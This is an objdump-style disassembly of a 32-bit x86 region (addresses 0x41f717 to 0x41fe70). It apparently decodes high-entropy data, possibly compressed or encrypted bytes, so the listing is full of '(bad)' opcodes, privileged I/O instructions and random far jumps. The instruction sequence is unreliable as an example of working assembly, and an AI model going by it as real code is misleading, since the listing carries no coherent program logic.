  41f717:	xor    dh,cl
  41f719:	cli    
  41f71a:	ss cli 
  41f71c:	add    ebp,edi
  41f71e:	popf   
  41f71f:	dec    esp
  41f720:	fwait
  41f721:	sbb    al,0x7d
  41f723:	mov    WORD PTR [edi-0x22],?
  41f726:	dec    edx
  41f727:	inc    ecx
  41f728:	outs   dx,BYTE PTR ds:[esi]
  41f729:	daa    
  41f72a:	js     0x41f711
  41f72c:	inc    esi
  41f72d:	in     al,dx
  41f72e:	pop    es
  41f72f:	daa    
  41f730:	fisubr WORD PTR [ecx]
  41f732:	cwde   
  41f733:	int    0x9c
  41f735:	ss pop ebx
  41f737:	push   ecx
  41f738:	pop    eax
  41f739:	(bad)  
  41f73a:	imul   esp,DWORD PTR [edx+ebx*8-0x573ca8dc],0x66ebb364
  41f745:	lods   al,BYTE PTR ds:[esi]
  41f746:	dec    ebp
  41f747:	mov    ebp,0xd9ba1d45
  41f74c:	push   ebx
  41f74d:	inc    ebp
  41f74e:	sbb    al,0xe4
  41f750:	mov    cs,WORD PTR [ecx]
  41f752:	pop    ss
  41f753:	repnz inc ebp
  41f755:	mov    edi,0xc41a58c4
  41f75a:	xor    DWORD PTR [esi],eax
  41f75c:	pop    ebp
  41f75d:	mov    dh,0x93
  41f75f:	mov    ds:0x5b7f5d42,al
  41f764:	mov    edx,0xffa95406
  41f769:	popf   
  41f76a:	std    
  41f76b:	jecxz  0x41f7ca
  41f76d:	in     eax,dx
  41f76e:	cmp    BYTE PTR [edi+edx*4+0x28],0xdd
  41f773:	sbb    BYTE PTR [ebp-0x58],ah
  41f776:	inc    bp
  41f778:	and    al,0xb1
  41f77a:	push   ebx
  41f77b:	xchg   edi,eax
  41f77c:	sbb    esi,ecx
  41f77e:	sbb    DWORD PTR [ebx],esp
  41f780:	fnstenv [ecx+eax*1]
  41f783:	and    ebp,DWORD PTR [ecx]
  41f785:	scas   al,BYTE PTR es:[edi]
  41f786:	xchg   BYTE PTR [edi+0x50],bl
  41f789:	fstp   QWORD PTR [ebp+0x43e69d8]
  41f78f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f790:	cmp    esi,edi
  41f792:	mov    bl,0xc7
  41f794:	mov    ds:0xf543be7d,al
  41f799:	mov    esp,0xd61c6992
  41f79e:	bound  edx,QWORD PTR [esi]
  41f7a0:	xlat   BYTE PTR ds:[ebx]
  41f7a1:	sub    dl,dh
  41f7a3:	arpl   WORD PTR [edi],bp
  41f7a5:	cmp    edx,0x16
  41f7a8:	aam    0xc9
  41f7aa:	ret    
  41f7ab:	loope  0x41f75f
  41f7ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7ae:	(bad)  
  41f7af:	pusha  
  41f7b0:	in     al,0x98
  41f7b2:	sbb    esp,esp
  41f7b4:	mov    bh,0xf0
  41f7b6:	dec    edx
  41f7b7:	sbb    dh,BYTE PTR [eax-0x55051862]
  41f7bd:	(bad)  
  41f7be:	mov    ch,0xd9
  41f7c0:	mov    WORD PTR [di-0x565d],gs
  41f7c5:	push   esp
  41f7c6:	fnstenv [esi+0x47]
  41f7c9:	scas   eax,DWORD PTR es:[edi]
  41f7ca:	icebp  
  41f7cb:	or     esi,DWORD PTR [ecx-0xc66e73c]
  41f7d1:	add    al,0xbc
  41f7d3:	(bad)  
  41f7d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7d6:	add    esp,DWORD PTR [edx+ebx*2-0x2a]
  41f7da:	outs   dx,BYTE PTR ds:[esi]
  41f7db:	daa    
  41f7dc:	push   es
  41f7dd:	add    DWORD PTR [edx+edi*4+0x64],edi
  41f7e1:	jnp    0x41f7c5
  41f7e3:	stc    
  41f7e4:	push   es
  41f7e5:	mov    eax,0xe56948e6
  41f7ea:	mov    es,WORD PTR [edx-0xb]
  41f7ed:	and    BYTE PTR [eax+0x69],ah
  41f7f0:	out    0x18,eax
  41f7f2:	mov    al,ds:0x10ca6df6
  41f7f7:	mov    DWORD PTR [edx+0x3279adcc],ecx
  41f7fd:	data16 jno 0x41f7c5
  41f800:	aad    0xca
  41f802:	xor    eax,0xa7226327
  41f807:	addr16 add al,0xcd
  41f80a:	mov    esi,0x9881c138
  41f80f:	and    cl,bl
  41f811:	jl     0x41f851
  41f813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f814:	js     0x41f852
  41f816:	pop    esp
  41f817:	dec    edx
  41f818:	or     al,0x89
  41f81a:	jecxz  0x41f891
  41f81c:	call   0xee80:0x1dc0cfa7
  41f823:	mov    ah,0xf2
  41f825:	fnsave [eax-0x36]
  41f828:	or     dl,al
  41f82a:	adc    ecx,DWORD PTR [edx]
  41f82c:	sub    ecx,DWORD PTR [ebx+0x38]
  41f82f:	stc    
  41f830:	inc    esp
  41f831:	out    dx,al
  41f832:	(bad)  
  41f833:	xchg   ebp,edx
  41f835:	je     0x41f868
  41f837:	mov    ds:0x1a51f68a,eax
  41f83c:	ret    0xac92
  41f83f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f840:	daa    
  41f841:	sbb    eax,0xb255dd5d
  41f846:	test   esp,esp
  41f848:	gs pop ebp
  41f84a:	push   edi
  41f84b:	cmp    al,0x1e
  41f84d:	enter  0x5465,0xe
  41f851:	(bad)  
  41f852:	sbb    BYTE PTR [ecx+0x62],0x60
  41f856:	or     DWORD PTR [edx+0x1d],0x3d84dd26
  41f85d:	mov    ebx,0xe8c45c1
  41f862:	and    esp,DWORD PTR [edx+0x3f92785b]
  41f868:	mov    ss,WORD PTR [ebx-0x7681231c]
  41f86e:	enter  0x85e4,0xa7
  41f872:	xchg   ecx,eax
  41f873:	in     eax,dx
  41f874:	pop    edx
  41f875:	mov    ds:0xc144eaae,eax
  41f87a:	pop    eax
  41f87b:	mov    ch,0xa
  41f87d:	das    
  41f87e:	or     eax,0x6e0a8a5e
  41f883:	xor    eax,0x3066a593
  41f888:	push   eax
  41f889:	mov    cl,0x3
  41f88b:	and    al,BYTE PTR [ecx-0x75eef669]
  41f891:	repz xchg esi,eax
  41f893:	pop    esi
  41f894:	adc    al,0xcc
  41f896:	sbb    DWORD PTR [eax],ecx
  41f898:	jg     0x41f8cb
  41f89a:	test   al,ch
  41f89c:	and    DWORD PTR [edi+ecx*2],0x6daf71e2
  41f8a3:	mov    cl,0xe8
  41f8a5:	and    esp,DWORD PTR [edi]
  41f8a7:	inc    ebx
  41f8a8:	ja     0x41f82b
  41f8aa:	(bad)  
  41f8ab:	mov    ds:0xbc47d928,al
  41f8b0:	pop    ecx
  41f8b1:	xor    BYTE PTR [edx],bh
  41f8b3:	sub    dh,BYTE PTR [ebx]
  41f8b5:	pusha  
  41f8b6:	adc    eax,0x9173c2f1
  41f8bb:	sti    
  41f8bc:	or     al,0xf
  41f8be:	cli    
  41f8bf:	(bad)  
  41f8c0:	loop   0x41f8b0
  41f8c2:	loopne 0x41f853
  41f8c4:	addr16 cwde 
  41f8c6:	bound  ecx,QWORD PTR [eax+0x7ad47f51]
  41f8cc:	cmc    
  41f8cd:	sub    ah,BYTE PTR [ecx+0x49]
  41f8d0:	out    0xd9,eax
  41f8d2:	or     ch,ah
  41f8d4:	cmp    al,0x86
  41f8d6:	lds    ecx,FWORD PTR [esi+0x52258b13]
  41f8dc:	(bad)  
  41f8dd:	loope  0x41f8a2
  41f8df:	xchg   edi,eax
  41f8e0:	call   0x494616c2
  41f8e5:	mov    edx,DWORD PTR [edi+0x3]
  41f8e8:	cmp    eax,0x1694662b
  41f8ed:	mov    edx,0x9fb330ab
  41f8f2:	test   cl,ah
  41f8f4:	xchg   ebx,eax
  41f8f5:	jmp    0x455c4f57
  41f8fa:	int    0x6
  41f8fc:	push   cs
  41f8fd:	les    ebp,FWORD PTR [ebp+0x72]
  41f900:	jb     0x41f8f0
  41f902:	fs mov ecx,0xd1988663
  41f908:	mov    esi,0xc19f4b04
  41f90d:	into   
  41f90e:	xchg   ecx,eax
  41f90f:	lods   eax,DWORD PTR ds:[esi]
  41f910:	seta   BYTE PTR [eax+edi*2+0x63ed226e]
  41f918:	jo     0x41f93f
  41f91a:	scas   al,BYTE PTR es:[edi]
  41f91b:	shr    BYTE PTR fs:[eax+0xde8f991],1
  41f922:	pop    edx
  41f923:	inc    ecx
  41f924:	dec    esi
  41f925:	rol    DWORD PTR [ecx+0x64fdde2d],1
  41f92b:	jb     0x41f921
  41f92d:	sbb    al,0x70
  41f92f:	(bad)  
  41f930:	push   ds
  41f931:	into   
  41f932:	fwait
  41f933:	cmc    
  41f934:	cmp    cl,BYTE PTR [edx]
  41f936:	imul   esi,DWORD PTR [eax+0x7086335b],0x2f
  41f93d:	xchg   esi,eax
  41f93e:	or     eax,0xd5dc3976
  41f943:	xor    eax,0xe120c582
  41f948:	icebp  
  41f949:	xor    eax,0x9cb3011e
  41f94e:	jmp    0x4e84:0xb57cf806
  41f955:	mov    edi,0x226c30f3
  41f95a:	pop    ss
  41f95b:	cdq    
  41f95c:	out    0x3,eax
  41f95e:	xor    al,0x7a
  41f960:	push   es
  41f961:	inc    edx
  41f962:	pop    ebp
  41f964:	mov    ch,0x4e
  41f966:	fnsave [edi+0x5f10ce41]
  41f96c:	mov    ds:0xac88b692,eax
  41f971:	or     edx,esi
  41f973:	add    BYTE PTR [ebp+0x52],dl
  41f976:	(bad)  
  41f977:	loopne 0x41f910
  41f979:	jecxz  0x41f9c2
  41f97b:	or     al,0xd8
  41f97d:	inc    esi
  41f97e:	ja     0x41f9b8
  41f980:	es mov cl,0x31
  41f983:	push   ebx
  41f984:	sub    al,0x5b
  41f986:	mov    WORD PTR [edi*2+0x1389b3b9],ds
  41f98d:	jmp    0x2e0c:0xf67d1369
  41f994:	stos   BYTE PTR es:[edi],al
  41f995:	je     0x41f954
  41f997:	repz neg DWORD PTR [edi]
  41f99a:	lods   al,BYTE PTR ds:[esi]
  41f99b:	loop   0x41f93f
  41f99d:	ds pop ss
  41f99f:	xor    BYTE PTR [esp+esi*1+0xb],ch
  41f9a3:	call   0x2d77:0x7a44e983
  41f9aa:	xchg   ecx,eax
  41f9ab:	jo     0x41f9c0
  41f9ad:	ja     0x41f9b7
  41f9af:	adc    edi,ebx
  41f9b1:	mov    eax,ds:0x190b0266
  41f9b6:	call   0x9203c14a
  41f9bb:	add    eax,DWORD PTR fs:[ebp+ebp*4+0x45]
  41f9c0:	mov    bl,0x70
  41f9c2:	inc    esi
  41f9c3:	inc    esp
  41f9c4:	and    eax,0xff3a10ee
  41f9c9:	cmp    DWORD PTR [ebx+0x6afb59e],edi
  41f9cf:	pop    esp
  41f9d0:	push   esi
  41f9d1:	lods   eax,DWORD PTR ds:[esi]
  41f9d2:	shl    DWORD PTR [esi+0x7364f7],cl
  41f9d8:	adc    dh,al
  41f9da:	sbb    al,0xf2
  41f9dc:	test   ecx,edi
  41f9de:	mov    cl,BYTE PTR [eax+0x1c]
  41f9e1:	or     BYTE PTR [ebp+0x3a174804],dh
  41f9e7:	imul   edx,DWORD PTR [ebx-0x6d1ef88d],0x3d1abf34
  41f9f1:	xchg   eax,edi
  41f9f3:	call   0xf67d:0xf9c64c81
  41f9fa:	jmp    FWORD PTR [ebp-0x2b]
  41f9fd:	xchg   esp,eax
  41f9fe:	dec    esi
  41f9ff:	mov    eax,ds:0x2b506ebf
  41fa04:	call   0x352e:0x9bb8da70
  41fa0b:	adc    BYTE PTR [eax-0x50],ah
  41fa0e:	pop    edx
  41fa0f:	js     0x41f9ce
  41fa11:	vmwrite edx,eax
  41fa14:	sub    DWORD PTR [edi-0x10],esp
  41fa17:	iret   
  41fa18:	outs   dx,DWORD PTR ds:[esi]
  41fa19:	stos   DWORD PTR es:[edi],eax
  41fa1a:	jmp    0x10f6ed66
  41fa1f:	inc    DWORD PTR [ebp+0x42]
  41fa22:	icebp  
  41fa23:	sqrtps xmm3,XMMWORD PTR [eax+0x2699667f]
  41fa2a:	sti    
  41fa2b:	cmp    al,0xc0
  41fa2d:	sub    ebp,ebp
  41fa2f:	or     BYTE PTR [esi],0x5c
  41fa32:	adc    dl,ch
  41fa34:	aaa    
  41fa35:	cmc    
  41fa36:	imul   esp,DWORD PTR ds:0xe8b0a392,0xffffffb5
  41fa3d:	ret    0x8e31
  41fa40:	sub    eax,0x7e284f50
  41fa45:	leave  
  41fa46:	xchg   esp,eax
  41fa47:	stos   BYTE PTR es:[edi],al
  41fa48:	dec    edi
  41fa49:	call   0x8198:0xa4ec1676
  41fa50:	iret   
  41fa51:	ror    ebx,cl
  41fa53:	mov    edi,0xa356e5f
  41fa58:	shl    BYTE PTR [esi-0x2089d675],0xe6
  41fa5f:	cwde   
  41fa60:	aam    0x3e
  41fa62:	sar    ch,cl
  41fa64:	lods   eax,DWORD PTR ds:[esi]
  41fa65:	push   es
  41fa66:	es sti 
  41fa68:	inc    ecx
  41fa69:	outs   dx,DWORD PTR ds:[esi]
  41fa6a:	and    ebx,0x74
  41fa6d:	adc    BYTE PTR [edx-0x1601ce3a],0xd9
  41fa74:	scas   al,BYTE PTR es:[edi]
  41fa75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa76:	shl    BYTE PTR [ecx],0xd1
  41fa79:	and    BYTE PTR ds:0xe450ad81,dl
  41fa7f:	sub    ax,0x1b15
  41fa83:	fisubr DWORD PTR [edx-0x70ef9f6d]
  41fa89:	loope  0x41fa19
  41fa8b:	outs   dx,DWORD PTR ds:[esi]
  41fa8c:	add    ah,ah
  41fa8e:	inc    ecx
  41fa8f:	dec    ebx
  41fa90:	in     eax,dx
  41fa91:	xor    BYTE PTR [ecx+esi*1-0xb],0x2
  41fa96:	retf   
  41fa97:	xor    cl,dl
  41fa99:	aad    0xab
  41fa9b:	scas   al,BYTE PTR es:[edi]
  41fa9c:	push   cs
  41fa9d:	mov    al,ds:0x93cb532e
  41faa2:	pop    ebx
  41faa3:	in     eax,0xf4
  41faa5:	mov    dl,0xd4
  41faa7:	mov    ah,0xf
  41faa9:	cdq    
  41faaa:	cmp    BYTE PTR [ecx+0x2a],dl
  41faad:	call   0xbbad:0xcf41ff6f
  41fab4:	not    BYTE PTR [esi-0x649b20fc]
  41faba:	into   
  41fabb:	xchg   ebx,eax
  41fabc:	jbe    0x41fa5f
  41fabe:	push   edx
  41fabf:	js     0x41fa93
  41fac1:	stos   BYTE PTR es:[edi],al
  41fac2:	inc    ebx
  41fac3:	mov    ds:0xa97caa81,eax
  41fac8:	push   bp
  41faca:	pop    ss
  41facb:	lods   al,BYTE PTR ds:[esi]
  41facc:	test   al,0x31
  41face:	sub    BYTE PTR [esi-0x4914deab],cl
  41fad4:	push   0xffffff9c
  41fad6:	jns    0x41fa9f
  41fad8:	mov    dh,0x57
  41fada:	dec    ecx
  41fadb:	mov    dh,BYTE PTR [edi]
  41fadd:	push   ebx
  41fade:	xor    al,0x70
  41fae0:	xor    ebx,DWORD PTR [edi]
  41fae2:	enter  0x8a69,0xbf
  41fae6:	push   0x5e
  41fae8:	(bad)  
  41fae9:	shl    esi,1
  41faeb:	push   ebx
  41faec:	stc    
  41faed:	fmul   st(6),st
  41faef:	adc    eax,DWORD PTR [edi]
  41faf1:	jnp    0x41fb4f
  41faf3:	fnstenv [ecx]
  41faf5:	fcmovnb st,st(6)
  41faf7:	ror    DWORD PTR [edi],1
  41faf9:	sbb    eax,0xbd438d1c
  41fafe:	ret    0x1729
  41fb01:	jne    0x41fb23
  41fb03:	lock enter 0x3917,0x43
  41fb08:	hlt    
  41fb09:	mov    dh,0xd5
  41fb0b:	out    dx,eax
  41fb0c:	adc    DWORD PTR [edi+0x794e943],0x180ceff0
  41fb16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb17:	ret    
  41fb18:	xchg   edi,eax
  41fb19:	and    BYTE PTR [ebp-0x2ad90b32],cl
  41fb1f:	jns    0x41fae7
  41fb21:	xchg   edx,eax
  41fb22:	icebp  
  41fb23:	neg    DWORD PTR [ebx-0x4fa3b9e9]
  41fb29:	jnp    0x41fac0
  41fb2b:	cmc    
  41fb2c:	js     0x41fb35
  41fb2e:	popf   
  41fb2f:	fdivrp st(0),st
  41fb31:	dec    eax
  41fb32:	das    
  41fb33:	repnz mov dl,BYTE PTR [edi+0x3abf03f]
  41fb3a:	adc    al,0x9a
  41fb3c:	idiv   DWORD PTR gs:[edx+0x7]
  41fb40:	ins    DWORD PTR es:[edi],dx
  41fb41:	ret    
  41fb42:	push   ss
  41fb43:	scas   al,BYTE PTR es:[edi]
  41fb44:	iret   
  41fb45:	mov    bl,0x15
  41fb47:	add    DWORD PTR [edi+0x5],esp
  41fb4a:	int3   
  41fb4b:	mov    dl,0x3b
  41fb4d:	mov    eax,0xeb034af0
  41fb52:	ins    DWORD PTR es:[edi],dx
  41fb53:	dec    edi
  41fb54:	xchg   esp,ecx
  41fb56:	mov    eax,ds:0x8b4b71d3
  41fb5b:	test   al,0x6b
  41fb5d:	ret    0x28cd
  41fb60:	test   DWORD PTR [edi],0xec83293
  41fb66:	and    al,0x46
  41fb68:	mov    ah,0xcc
  41fb6a:	or     eax,0x9734f390
  41fb6f:	push   ebx
  41fb70:	xlat   BYTE PTR ds:[ebx]
  41fb71:	mov    al,0x3c
  41fb73:	sahf   
  41fb74:	sub    eax,0xd964583d
  41fb79:	scas   eax,DWORD PTR es:[edi]
  41fb7a:	sub    BYTE PTR [edi],cl
  41fb7c:	push   eax
  41fb7d:	(bad)  
  41fb7e:	xor    BYTE PTR ds:0x7c559b02,dl
  41fb84:	cmp    al,0x3f
  41fb86:	xor    DWORD PTR [edi-0x46],ebp
  41fb89:	ja     0x41fbd1
  41fb8b:	mov    bl,0xfa
  41fb8d:	mov    edi,0x112c2c7b
  41fb92:	add    al,0x79
  41fb94:	add    bl,dl
  41fb96:	lahf   
  41fb97:	push   eax
  41fb98:	and    al,0x8b
  41fb9a:	imul   esi,edi,0xe1fa92e7
  41fba0:	cmc    
  41fba1:	jae    0x41fbb9
  41fba3:	stos   BYTE PTR es:[edi],al
  41fba4:	add    eax,0xd7e5c564
  41fba9:	dec    ecx
  41fbaa:	clc    
  41fbab:	mov    esi,0x680f80ba
  41fbb0:	ficom  DWORD PTR [eax+0x29]
  41fbb3:	push   ebp
  41fbb4:	inc    ecx
  41fbb5:	or     BYTE PTR [edx-0x60],cl
  41fbb8:	xchg   BYTE PTR [edi-0x2b],al
  41fbbb:	fadd   st(7),st
  41fbbd:	mov    bh,al
  41fbbf:	and    cl,BYTE PTR [esi-0x3e166271]
  41fbc5:	fistp  QWORD PTR [edx+0x105f328b]
  41fbcb:	inc    edx
  41fbcc:	cdq    
  41fbcd:	xchg   ebx,eax
  41fbce:	std    
  41fbcf:	out    dx,eax
  41fbd0:	jmp    DWORD PTR [eax-0x4]
  41fbd3:	or     al,0x92
  41fbd5:	fisttp DWORD PTR [edi-0x1]
  41fbd8:	cwde   
  41fbd9:	lock mov ch,0xc1
  41fbdc:	sti    
  41fbdd:	xor    dl,BYTE PTR [ebx-0x5a]
  41fbe0:	fs mov ebp,?
  41fbe3:	push   ecx
  41fbe4:	sahf   
  41fbe5:	push   edx
  41fbe6:	js     0x41fbc8
  41fbe8:	add    ecx,DWORD PTR [esi-0x3211682a]
  41fbee:	loope  0x41fbcd
  41fbf0:	jp     0x41fc16
  41fbf2:	lock sbb bl,BYTE PTR [ebp+eax*1-0x2]
  41fbf7:	aas    
  41fbf8:	rol    BYTE PTR [ebx+0xe],0x5c
  41fbfc:	inc    ebx
  41fbfd:	shr    DWORD PTR [esi+0x1ae03ee3],cl
  41fc03:	inc    ebp
  41fc04:	add    dl,dh
  41fc06:	cmp    eax,0x347a6f00
  41fc0b:	or     edx,eax
  41fc0d:	ret    0x3a3c
  41fc10:	sbb    bl,cl
  41fc12:	in     eax,dx
  41fc13:	add    eax,0x4c9a7763
  41fc18:	dec    edx
  41fc19:	fist   DWORD PTR [ebx-0x3c03ccd6]
  41fc1f:	dec    ebp
  41fc20:	loope  0x41fbce
  41fc22:	mov    ah,0xe8
  41fc24:	mov    eax,0xc12b3879
  41fc29:	inc    eax
  41fc2a:	mov    al,ds:0x65aa82da
  41fc2f:	sub    ebp,eax
  41fc31:	sub    BYTE PTR [ecx+ebp*8],bl
  41fc34:	rol    DWORD PTR [ecx-0x76ea6cb2],0x40
  41fc3b:	js     0x41fc31
  41fc3d:	jmp    0x41fc92
  41fc3f:	sub    cl,BYTE PTR [ecx-0x5583902b]
  41fc45:	repz sti 
  41fc47:	cmp    DWORD PTR [edi],edx
  41fc49:	jecxz  0x41fc18
  41fc4b:	jmp    0x41fc8b
  41fc4d:	popf   
  41fc4e:	sti    
  41fc4f:	mov    ebx,0xeff85db5
  41fc54:	mov    ds:0x4052d25f,al
  41fc59:	ds leave 
  41fc5b:	and    DWORD PTR [ebx-0x2827ff43],edi
  41fc61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc62:	push   ebx
  41fc63:	retf   
  41fc64:	outs   dx,BYTE PTR ds:[esi]
  41fc65:	or     al,0xa6
  41fc67:	jne    0x41fbfb
  41fc69:	loope  0x41fc49
  41fc6b:	pop    ds
  41fc6c:	lds    esp,FWORD PTR [edx+0x47bd77ef]
  41fc72:	das    
  41fc73:	pop    eax
  41fc74:	dec    ebp
  41fc75:	inc    esi
  41fc76:	pop    ebx
  41fc77:	sub    eax,0xd6882ce1
  41fc7c:	pop    edi
  41fc7d:	hlt    
  41fc7e:	cs mov dl,0xd4
  41fc81:	mov    edx,0x9bfe66ac
  41fc86:	dec    ebx
  41fc87:	hlt    
  41fc88:	aas    
  41fc89:	sub    ch,BYTE PTR [edi]
  41fc8b:	xlat   BYTE PTR ds:[ebx]
  41fc8c:	aas    
  41fc8d:	les    ebp,FWORD PTR [ebp-0x1af709d8]
  41fc93:	sub    bl,cl
  41fc95:	cmp    dh,ch
  41fc97:	push   esi
  41fc98:	in     eax,dx
  41fc99:	jo     0x41fc45
  41fc9b:	cmp    dh,BYTE PTR [edx]
  41fc9d:	mov    ebp,0x3942b20d
  41fca2:	ja     0x41fcfc
  41fca4:	jmp    0xa5652a53
  41fca9:	mov    al,ds:0xdd2e1b8
  41fcae:	loopne 0x41fc60
  41fcb0:	mov    ds:0x7b662b87,al
  41fcb5:	mov    ?,WORD PTR [esi+edi*8-0x50]
  41fcb9:	dec    ebp
  41fcba:	mov    ebp,0x24a35a61
  41fcbf:	jmp    0x24eea8f6
  41fcc4:	repz inc esp
  41fcc6:	rcr    BYTE PTR ds:0xde16f98a,1
  41fccc:	ret    0x63db
  41fccf:	ins    DWORD PTR es:[edi],dx
  41fcd0:	out    0x63,al
  41fcd2:	xor    al,0xb1
  41fcd4:	call   0x249e2016
  41fcd9:	std    
  41fcda:	ror    DWORD PTR [ecx+0x39],0x39
  41fcde:	test   BYTE PTR [ecx+0x1128fffd],0x47
  41fce5:	cwde   
  41fce6:	push   ecx
  41fce7:	jae    0x41fce4
  41fce9:	retf   
  41fcea:	das    
  41fceb:	add    al,0x2a
  41fced:	lds    eax,FWORD PTR [edx-0x33]
  41fcf0:	popa   
  41fcf1:	fiadd  DWORD PTR [esi]
  41fcf3:	in     eax,0xfc
  41fcf5:	pop    ds
  41fcf6:	pop    esp
  41fcf7:	mov    bh,0x8f
  41fcf9:	push   ecx
  41fcfa:	mov    edi,DWORD PTR [esi-0x63]
  41fcfd:	or     BYTE PTR [ebp-0x8c38404],dh
  41fd03:	jne    0x41fd03
  41fd05:	lods   al,BYTE PTR ds:[esi]
  41fd06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd07:	pop    ss
  41fd08:	pop    ecx
  41fd09:	inc    ebx
  41fd0a:	dec    BYTE PTR [ecx]
  41fd0c:	cld    
  41fd0d:	push   esp
  41fd0e:	sub    BYTE PTR cs:[edx+ebp*1+0x60],0xeb
  41fd14:	fdivr  QWORD PTR [edi+esi*1+0x7]
  41fd18:	outs   dx,BYTE PTR ds:[esi]
  41fd19:	and    edx,DWORD PTR [eax+0x48]
  41fd1c:	xchg   ebx,eax
  41fd1d:	mov    ds:0xdf4bd03c,al
  41fd22:	sbb    edi,DWORD PTR [esi]
  41fd24:	and    al,0x77
  41fd26:	cmp    ebp,ecx
  41fd28:	aaa    
  41fd29:	inc    esp
  41fd2a:	out    dx,eax
  41fd2b:	lods   al,BYTE PTR ds:[esi]
  41fd2c:	rcl    DWORD PTR [edi+0x47],cl
  41fd2f:	dec    edi
  41fd30:	adc    BYTE PTR [eax-0x13],0xb9
  41fd34:	mov    cl,0xae
  41fd36:	and    al,0x82
  41fd38:	mov    esp,0x215ef85
  41fd3d:	repnz mov eax,ds:0xd2c5b379
  41fd43:	ins    BYTE PTR es:[edi],dx
  41fd44:	bound  esp,QWORD PTR [edi]
  41fd46:	dec    edi
  41fd47:	pop    edx
  41fd48:	dec    ecx
  41fd49:	mov    edx,0x29fb0fe5
  41fd4e:	push   0x6dc99630
  41fd53:	xchg   ecx,eax
  41fd54:	retf   0xb4ea
  41fd57:	ror    BYTE PTR [ecx+0x78d4965f],cl
  41fd5d:	test   DWORD PTR [eax+0x37],eax
  41fd60:	shl    DWORD PTR [ecx+edi*4],1
  41fd63:	(bad)  
  41fd64:	jmp    0x1cda2e5d
  41fd69:	repnz dec edi
  41fd6b:	add    ebx,DWORD PTR [esi-0x7b]
  41fd6e:	ins    BYTE PTR es:[edi],dx
  41fd6f:	ret    0xf0d9
  41fd72:	mov    ah,BYTE PTR [edx]
  41fd74:	xchg   esp,eax
  41fd75:	sub    BYTE PTR [edx+0x48],cl
  41fd78:	out    0x8e,al
  41fd7a:	lods   eax,DWORD PTR ds:[esi]
  41fd7b:	cmp    ah,BYTE PTR [esi+0x20dac11d]
  41fd81:	je     0x41fd1b
  41fd83:	adc    DWORD PTR [eax],ebp
  41fd85:	adc    esp,DWORD PTR [esi]
  41fd87:	(bad)  
  41fd88:	int3   
  41fd89:	sub    eax,0x52111890
  41fd8e:	inc    eax
  41fd8f:	sub    eax,0x59f13e4a
  41fd94:	jl     0x41fd7c
  41fd96:	stos   DWORD PTR es:[edi],eax
  41fd97:	mov    al,0x6e
  41fd99:	test   al,0x63
  41fd9b:	jp     0x41fdfa
  41fd9d:	and    edi,edx
  41fd9f:	dec    esp
  41fda0:	jnp    0x41fdfb
  41fda2:	or     DWORD PTR [edi-0x4d640163],ecx
  41fda8:	cmp    ebx,edx
  41fdaa:	inc    edx
  41fdab:	mov    ebx,DWORD PTR [esi]
  41fdad:	bound  ecx,QWORD PTR [edx+0x4abb2f85]
  41fdb3:	sbb    ecx,DWORD PTR [ecx-0x16]
  41fdb6:	mov    dl,0xeb
  41fdb8:	cmc    
  41fdb9:	test   DWORD PTR [edx],ebp
  41fdbb:	pusha  
  41fdbc:	pop    esi
  41fdbd:	fnsave [ebx]
  41fdbf:	ret    
  41fdc0:	xor    BYTE PTR [ebx],dh
  41fdc2:	pop    edx
  41fdc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdc4:	mov    ch,0x1c
  41fdc6:	icebp  
  41fdc7:	mov    dl,0x4c
  41fdc9:	inc    ebp
  41fdca:	push   esp
  41fdcb:	imul   esi,DWORD PTR [edx+0x6967f9f0],0x21ef5cb2
  41fdd5:	daa    
  41fdd6:	sub    esp,DWORD PTR [esi+0x6b]
  41fdd9:	xchg   DWORD PTR [esi+0x61],edi
  41fddc:	mov    ebx,0x6edeb2d7
  41fde1:	xchg   ebp,eax
  41fde2:	std    
  41fde3:	ds sub eax,0x1b7bc82a
  41fde9:	xor    BYTE PTR [edi+0x5db393a9],al
  41fdef:	(bad)  
  41fdf0:	rcl    DWORD PTR [esi+0x26],1
  41fdf3:	rcl    BYTE PTR [esi-0x18],1
  41fdf6:	dec    esp
  41fdf7:	pop    eax
  41fdf8:	and    DWORD PTR ds:0xc2aa01a1,ebp
  41fdfe:	xor    BYTE PTR [ebx-0x53],0xb8
  41fe02:	out    dx,eax
  41fe03:	loop   0x41fe04
  41fe05:	arpl   WORD PTR [esi],bx
  41fe07:	xor    al,0x5a
  41fe09:	into   
  41fe0a:	or     ecx,DWORD PTR [ebx+eax*2]
  41fe0d:	mov    edx,0x389cce7f
  41fe12:	adc    eax,0x2f780094
  41fe17:	sub    DWORD PTR [esi-0x70],edi
  41fe1a:	mov    eax,ds:0xfa12dc1f
  41fe1f:	(bad)  
  41fe20:	mov    ds:0x80d6c5ef,al
  41fe25:	(bad)  
  41fe26:	cmc    
  41fe27:	mov    ecx,0x213ee801
  41fe2c:	sub    dh,ch
  41fe2e:	sub    esp,DWORD PTR [ebx]
  41fe30:	mov    ebx,0xc98d03ae
  41fe35:	mov    esi,0x7d1ec168
  41fe3a:	pop    ss
  41fe3b:	ret    
  41fe3c:	dec    esp
  41fe3d:	sbb    BYTE PTR [esi],ch
  41fe3f:	and    al,BYTE PTR [esi+0x260ea12f]
  41fe45:	xchg   esp,eax
  41fe46:	xchg   ecx,eax
  41fe47:	inc    esp
  41fe48:	jb     0x41feb8
  41fe4a:	and    eax,0xb1f85e
  41fe4f:	rol    DWORD PTR [esi-0x53887c36],0x2e
  41fe56:	in     eax,dx
  41fe57:	in     eax,dx
  41fe58:	xchg   BYTE PTR [eax-0x65],al
  41fe5b:	push   0xffffff8e
  41fe5d:	dec    eax
  41fe5e:	std    
  41fe5f:	pop    ebx
  41fe60:	out    dx,eax
  41fe61:	and    bl,ch
  41fe63:	dec    eax
  41fe64:	or     dl,bl
  41fe66:	or     eax,0xaa19587f
  41fe6b:	cmp    al,0x38
  41fe6d:	outs   dx,BYTE PTR ds:[esi]
  41fe6e:	jbe    0x41fe3a
  41fe70:	add    BYTE PTR [ebx+esi*2+0x66],bh
